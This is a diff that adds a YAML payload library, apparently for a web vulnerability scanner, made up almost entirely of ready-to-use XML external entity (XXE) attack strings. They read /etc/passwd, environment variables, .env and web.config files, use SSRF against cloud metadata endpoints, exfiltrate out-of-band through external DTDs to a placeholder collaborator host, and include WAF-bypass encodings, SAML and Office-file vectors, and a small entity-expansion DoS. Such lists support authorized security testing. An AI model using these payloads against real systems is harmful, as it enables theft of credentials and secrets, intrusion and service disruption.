@@ -1,0 +1,413 @@
+defaults:
+  vuln_type: xxe
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # File read — basic
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    notes: "Basic XXE file read. Check response for /etc/passwd contents."
+    tags: [file_read, linux, passwd, basic]
+
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><foo>&xxe;</foo>"
+    notes: "Read hostname for confirmation."
+    tags: [file_read, linux, hostname, confirmation]
+
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><foo>&xxe;</foo>"
+    notes: "Windows XXE file read — win.ini."
+    tags: [file_read, windows, win_ini]
+
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>"
+    notes: "Read process environment variables. May leak secrets."
+    tags: [file_read, linux, environ]
+
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file://.env\">]><foo>&xxe;</foo>"
+    notes: "Read .env file via relative path."
+    tags: [file_read, dotenv, secrets]
+
+  # File read — Java-specific
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///WEB-INF/web.xml\">]><foo>&xxe;</foo>"
+    notes: "Java web.xml file read. Contains servlet mappings, security constraints, and context params."
+    tags: [file_read, java, web_inf, web_xml]
+
+  # File read — PHP base64 filter (for binary/PHP files)
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    runtime: php
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=FILE_PATH\">]><foo>&xxe;</foo>"
+    placeholders: [FILE_PATH]
+    notes: "PHP filter wrapper for base64-encoded file read. Avoids XML parsing errors."
+    tags: [file_read, php, filter, base64]
+
+  # ============================================================
+  # SSRF via XXE
+  # ============================================================
+  - technique: xxe_ssrf
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+    notes: "XXE SSRF to AWS metadata endpoint."
+    tags: [ssrf, aws, metadata, cloud]
+
+  - technique: xxe_ssrf
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:PORT/\">]><foo>&xxe;</foo>"
+    placeholders: [PORT]
+    notes: "XXE SSRF to internal ports. Scan for open services."
+    tags: [ssrf, port_scan, internal]
+
+  - technique: xxe_ssrf
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 2
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLAB_DOMAIN/xxe\">]><foo>&xxe;</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "XXE SSRF to external domain for OOB confirmation."
+    tags: [ssrf, oob, dns, confirmation]
+
+  # ============================================================
+  # Out-of-band (blind XXE)
+  # ============================================================
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLAB_DOMAIN/xxe.dtd\">%xxe;]><foo>bar</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB XXE via external DTD. Host a DTD that exfiltrates data."
+    tags: [oob, external_dtd, blind]
+
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % dtd SYSTEM \"http://COLLAB_DOMAIN/xxe.dtd\">%dtd;]><foo>&send;</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB data exfiltration. DTD should define &send; to exfil %file; value."
+    tags: [oob, exfiltration, hostname]
+
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://COLLAB_DOMAIN/%file;\"><!ENTITY % file SYSTEM \"file:///etc/hostname\">%xxe;]>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Inline OOB exfiltration attempt. May not work in all parsers."
+    tags: [oob, inline, hostname]
+
+  # Parameter entity abuse
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % a SYSTEM \"file:///etc/passwd\"><!ENTITY % b \"<!ENTITY &#37; c SYSTEM 'http://COLLAB_DOMAIN/?data=%a;'>\">%b;%c;]>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Nested parameter entity for OOB exfiltration."
+    tags: [oob, parameter_entity, nested]
+
+  # Parameter-entity-only (no general entity reference in body)
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % ext SYSTEM \"http://COLLAB_DOMAIN/pe-only.dtd\">%ext;%exfil;]><foo>bar</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Parameter-entity-only OOB. No general entity in body — bypasses parsers that block &xxe; in content but allow % entities in DTD. Host DTD: <!ENTITY % data SYSTEM 'file:///etc/passwd'><!ENTITY % exfil '<!ENTITY &#37; send SYSTEM \"http://COLLAB_DOMAIN/?d=%data;\">'>%send;"
+    tags: [oob, parameter_entity_only, bypass]
+
+  # OOB via FTP (Java parsers)
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    runtime: jvm
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % dtd SYSTEM \"http://COLLAB_DOMAIN/ftp-xxe.dtd\">%dtd;]><foo>bar</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Java OOB via FTP channel. DTD redirects entity to ftp://COLLAB_DOMAIN/%file; — Java XML parsers follow FTP URIs allowing multi-line exfiltration that HTTP OOB cannot."
+    tags: [oob, ftp, java, multi_line_exfil]
+
+  # ============================================================
+  # DoS — Billion Laughs (use with extreme caution)
+  # ============================================================
+  - technique: xxe_dos
+    injection_surface: xml_body
+    evidence_type: timing
+    risk: 5
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY a \"AAAAAAAAAA\"><!ENTITY b \"&a;&a;&a;&a;&a;\"><!ENTITY c \"&b;&b;&b;&b;&b;\">]><foo>&c;</foo>"
+    notes: "MINI Billion Laughs — small version. Tests entity expansion limits. RISK 5."
+    tags: [dos, entity_expansion, billion_laughs, destructive]
+
+  # ============================================================
+  # Content-Type manipulation
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    notes: "Send XML body with Content-Type: application/xml to endpoint that normally takes JSON."
+    tags: [file_read, content_type_switch, json_to_xml]
+
+  # ============================================================
+  # XInclude
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>"
+    notes: "XInclude attack. No DOCTYPE needed — works when only part of XML is controlled."
+    tags: [xinclude, file_read, no_doctype]
+
+  # ============================================================
+  # File upload vectors
+  # ============================================================
+  # SVG upload XXE
+  - technique: xxe_file_read
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>"
+    notes: "XXE via SVG file upload. Upload as .svg, check if entity expanded in rendered image."
+    tags: [svg, file_upload, file_read]
+
+  # XLSX XXE (Office Open XML — sheet1.xml)
+  - technique: xxe_file_read
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><worksheet xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\"><sheetData><row><c t=\"str\"><v>&xxe;</v></c></row></sheetData></worksheet>"
+    notes: "XXE in XLSX sheet1.xml. Unzip XLSX, modify xl/worksheets/sheet1.xml, repack. Check parsed output."
+    tags: [xlsx, file_upload, office, file_read]
+
+  # DOCX XXE (word/document.xml)
+  - technique: xxe_file_read
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><w:document xmlns:w=\"http://schemas.openxmlformats.org/wordprocessingml/2006/main\"><w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body></w:document>"
+    notes: "XXE in DOCX word/document.xml. Unzip DOCX, inject entity into document.xml, repack. Server-side document processing may parse and expand."
+    tags: [docx, file_upload, office, file_read]
+
+  # PPTX XXE (ppt/presentation.xml)
+  - technique: xxe_file_read
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hostname\">]><p:presentation xmlns:p=\"http://schemas.openxmlformats.org/presentationml/2006/main\" xmlns:a=\"http://schemas.openxmlformats.org/drawingml/2006/main\" xmlns:r=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships\"><p:sldMasterIdLst><p:sldMasterId id=\"2147483648\" r:id=\"rId1\"/></p:sldMasterIdLst></p:presentation>"
+    notes: "XXE in PPTX ppt/presentation.xml. Entity expansion in PowerPoint XML. Also try [Content_Types].xml in any OOXML file."
+    tags: [pptx, file_upload, office, file_read]
+
+  # XML file upload with Content-Type override
+  - technique: xxe_file_read
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    notes: "Upload file with .xml extension or set Content-Type: application/xml on file upload. Targets file processing pipelines that parse XML uploads."
+    tags: [file_upload, xml_content_type, file_read]
+
+  # ============================================================
+  # RSS / Atom feed parsing
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><rss version=\"2.0\"><channel><title>&xxe;</title><link>http://example.com</link><description>test</description><item><title>Test</title></item></channel></rss>"
+    notes: "XXE in RSS feed. Targets apps that import/parse RSS feeds (feed aggregators, podcast processors, CMS feed importers)."
+    tags: [rss, feed, file_read]
+
+  - technique: xxe_ssrf
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://COLLAB_DOMAIN/atom-xxe\">]><feed xmlns=\"http://www.w3.org/2005/Atom\"><title>&xxe;</title><entry><title>Test</title><id>urn:uuid:1</id><updated>2024-01-01T00:00:00Z</updated></entry></feed>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "XXE via Atom feed. Check for OOB DNS hit when feed URL is submitted for parsing."
+    tags: [atom, feed, ssrf, oob]
+
+  # ============================================================
+  # SAML assertion XXE
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 4
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><samlp:Response xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\"><saml:Assertion><saml:Issuer>&xxe;</saml:Issuer></saml:Assertion></samlp:Response>"
+    notes: "XXE in SAML Response. Target the SAMLResponse POST parameter (base64 decoded). SAML processors must parse XML, making this a high-value vector in SSO flows."
+    tags: [saml, sso, file_read, enterprise]
+
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 4
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://COLLAB_DOMAIN/saml-xxe.dtd\">%dtd;]><samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"_xxe\" Version=\"2.0\" IssueInstant=\"2024-01-01T00:00:00Z\"><saml:Issuer xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">test</saml:Issuer></samlp:AuthnRequest>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Blind XXE in SAML AuthnRequest via external DTD. Some SP/IdP implementations parse AuthnRequest XML without disabling external entities."
+    tags: [saml, sso, oob, blind, enterprise]
+
+  # ============================================================
+  # Error-based XXE
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: error
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#37; exfil SYSTEM 'file:///nonexistent/%file;'>\">%eval;%exfil;]><foo>bar</foo>"
+    notes: "Error-based XXE. Forces a file-not-found error containing the contents of /etc/hostname in the error message. Works when response is not reflected but errors are verbose."
+    tags: [error_based, file_read, verbose_errors]
+
+  # ============================================================
+  # XSLT injection
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('file:///etc/passwd')\"/></xsl:template></xsl:stylesheet>"
+    notes: "XSLT document() function for file read. Targets apps that apply user-supplied or injectable XSLT transformations."
+    tags: [xslt, file_read, document_function]
+
+  - technique: xxe_ssrf
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"><xsl:value-of select=\"document('http://COLLAB_DOMAIN/xslt-ssrf')\"/></xsl:template></xsl:stylesheet>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "XSLT SSRF via document(). Confirm with OOB DNS callback."
+    tags: [xslt, ssrf, oob]
+
+  # ============================================================
+  # URL-encoded
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 3
+    payload: "%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20foo%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Cfoo%3E%26xxe%3B%3C%2Ffoo%3E"
+    notes: "URL-encoded XXE payload for query parameter."
+    tags: [file_read, url_encoded]
+
+  # ============================================================
+  # SOAP-based XXE
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>"
+    notes: "XXE embedded in SOAP envelope."
+    tags: [soap, file_read, enterprise]
+
+  # ============================================================
+  # Encoding bypass
+  # ============================================================
+  # UTF-7 encoding bypass
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-!DOCTYPE+ACA-foo+ACA-+AFs-+ADw-!ENTITY+ACA-xxe+ACA-SYSTEM+ACA-+ACI-file:///etc/passwd+ACI-+AD4-+AF0-+AD4-+ADw-foo+AD4-+ACY-xxe+ADs-+ADw-/foo+AD4-"
+    notes: "UTF-7 encoded XXE. Bypasses filters looking for DOCTYPE/ENTITY in UTF-8."
+    tags: [file_read, utf7, bypass]
+
+  # UTF-16 encoding bypass
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    notes: "UTF-16 declared encoding. Payload must be sent with UTF-16 byte encoding. Bypasses WAFs inspecting UTF-8 byte patterns for DOCTYPE/ENTITY keywords."
+    tags: [file_read, utf16, bypass, waf]
+
+  # ============================================================
+  # Library-specific payloads
+  # ============================================================
+  # libxml2 / lxml (Python) — entity loading enabled by default in older versions
+  - technique: xxe_oob
+    injection_surface: xml_body
+    evidence_type: dns_hit
+    risk: 3
+    runtime: python
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % pe SYSTEM \"http://COLLAB_DOMAIN/libxml2-xxe.dtd\">%pe;]><foo>bar</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Targets Python lxml/libxml2. Older lxml (<4.6.5) and libxml2 with default settings resolve external entities. Use external DTD for exfiltration since libxml2 blocks inline parameter entity nesting."
+    tags: [oob, python, lxml, libxml2, library_specific]
+
+  # Xerces-J (Java) — XXE with SYSTEM entity
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    runtime: jvm
+    payload: "<?xml version=\"1.0\" standalone=\"no\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+    notes: "Targets Java Xerces / default DocumentBuilderFactory. Uses standalone=\"no\" to hint DTD dependency. External entity processing is enabled by default unless explicitly disabled via setFeature()."
+    tags: [file_read, java, xerces, library_specific]
+
+  # .NET XmlDocument — XXE with SYSTEM entity
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    runtime: dotnet
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/inetpub/wwwroot/web.config\">]><foo>&xxe;</foo>"
+    notes: "Targets .NET XmlDocument / XmlReader. Older .NET Framework (<4.5.2) resolves external entities by default. web.config contains connection strings, keys, and app settings."
+    tags: [file_read, dotnet, web_config, library_specific]
+
+  # ============================================================
+  # OOXML [Content_Types].xml (shared across XLSX/DOCX/PPTX)
+  # ============================================================
+  - technique: xxe_oob
+    injection_surface: file_upload
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % dtd SYSTEM \"http://COLLAB_DOMAIN/ooxml-xxe.dtd\">%dtd;]><Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"><Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/></Types>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "XXE in [Content_Types].xml — the first file parsed in any OOXML archive (XLSX, DOCX, PPTX). Blind OOB via external DTD. Unzip, replace [Content_Types].xml, repack."
+    tags: [ooxml, content_types, file_upload, oob, blind]
+
+  # ============================================================
+  # XXE via CDATA exfiltration wrapper
+  # ============================================================
+  - technique: xxe_file_read
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % start \"<![CDATA[\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://COLLAB_DOMAIN/cdata-xxe.dtd\">%dtd;]><foo>&all;</foo>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "CDATA wrapping technique. External DTD defines: <!ENTITY all '%start;%file;%end;'>. Wraps file contents in CDATA to avoid XML parsing errors from special characters in exfiltrated files (e.g., files containing < or &)."
+    tags: [file_read, cdata, special_chars, external_dtd]
